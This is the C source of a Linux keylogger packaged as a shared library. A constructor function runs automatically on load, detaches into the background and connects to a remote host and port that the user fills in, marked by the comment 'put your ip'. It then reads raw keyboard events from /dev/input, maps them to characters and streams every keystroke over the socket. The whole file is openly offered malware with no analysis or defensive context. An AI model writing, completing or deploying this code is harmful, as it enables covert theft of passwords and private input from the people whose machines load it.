#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <linux/input.h>
#include <fcntl.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>

int find_device(char *event_path) {
    FILE *file = fopen("/proc/bus/input/devices","r");
    if (file == NULL) {
        return 1;
    }
    char line[150];
    char event[150];
    int keyboard_found = 0;
    while (fgets(line,sizeof(line),file)) {
        if (strstr(line,"keyboard") || strstr(line,"Keyboard")) {
            keyboard_found = 1;
        }
        if (keyboard_found == 1 && strstr(line,"event")) {
            strcpy(event,line);
            char *event_pointer = strstr(event,"event");
            if (event_pointer) {
                char event_number[50];
                int i = 0;
                while (isalnum(event_pointer[i])) {
                    event_number[i] = event_pointer[i];
                    i++;
                }
                event_number[i] = '\0';
                strcpy(event_path, "/dev/input/");
                strcat(event_path, event_number);
                fclose(file);
                return 0;
            }
        }
    }
    fclose(file);
    return 1;
}
__attribute__((constructor))
void load_so(void) {
    int sock;
    pid_t pid = fork();
    if (pid < 0 || pid > 0) return;
   setsid();

    bool shift_down = false;
    bool caps_lock = false;
    char event_path[150] = "\0";
    const char* ip = "";//put your ip
    int port = ; //desired port
    struct sockaddr_in server;
    sock = socket(AF_INET,SOCK_STREAM,0);
    if (sock == -1) {
        return;
    }
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);
    if (connect(sock,(struct sockaddr *) &server,sizeof(server)) == -1) {
        return;
    }
    find_device(event_path); //finds eventX
    fflush(stdout);
    int device = open(event_path,O_RDONLY);
    if (device == -1) {
        perror("[ERROR] Failed to open input device");
        return;
    }
    struct input_event ev;
    while (1) {

        size_t key = read(device,&ev,sizeof(ev));
        if (key == -1) {
            break;
        }
        if (key != sizeof(ev)) {
            continue;
        }

        char english = '\0';
        char temp = '\0';
        if (ev.type != EV_KEY) continue;

        if ((ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) && ev.type == EV_KEY) {
            if (ev.value == 1) {
                shift_down = true;
            } else if (ev.value == 0)  {
                shift_down = false;
            }
        }

        if (ev.code == KEY_CAPSLOCK && ev.type == EV_KEY && ev.value == 1) {
            caps_lock = !caps_lock;
        }


        if (ev.value != 1) continue;

        const char special[] = {'!', '@','#','$','%', '^','&','*','(',')'};
        const char num[] = {'1','2','3','4','5','6','7','8','9','0'};
        const char top[] = {'q','w','e','r','t','y','u','i','o','p'};
        const char middle[] = {'a','s','d','f','g','h','j','k','l'};
        const char bottom[] = {'z','x','c','v','b','n','m'};

        if (ev.code == KEY_BACKSPACE) {
            english = '\b';
        }
        else if (shift_down == true|| caps_lock == true) {
            if (ev.code >= 2 && ev.code <= 11) {
                temp = special[ev.code - 2];
                english = temp;
            } else if (ev.code >= 16 && ev.code <= 25) {
                temp = top[ev.code - 16];
                english = toupper(temp);
            } else if (ev.code >= 30 && ev.code <= 38) {
                temp = middle[ev.code - 30];
                english = toupper(temp);
            } else if (ev.code >= 44 && ev.code <= 50) {
                temp = bottom[ev.code - 44];
                english = toupper(temp);
            }else if (ev.code == KEY_SPACE) {
                english = ' ';
            }
        } else {
            if (ev.code >= 2 && ev.code <= 11) {
                temp = num[ev.code - 2];
                english = temp;
            } else if (ev.code >= 16 && ev.code <= 25) {
                temp = top[ev.code - 16];
                english = temp;
            } else if (ev.code >= 30 && ev.code <= 38) {
                temp = middle[ev.code - 30];
                english = temp;
            } else if (ev.code >= 44 && ev.code <= 50) {
                temp = bottom[ev.code - 44];
                english = temp;
            }else if (ev.code == KEY_SPACE) {
                english = ' ';
            }
        }
        if (english != '\0') {
            ssize_t sent = send(sock, &english, 1, 0);
            if (sent == -1) {
                perror("[ERROR] send failed");
                break;
            }
        }

    }
    close(device);
    close(sock);
}
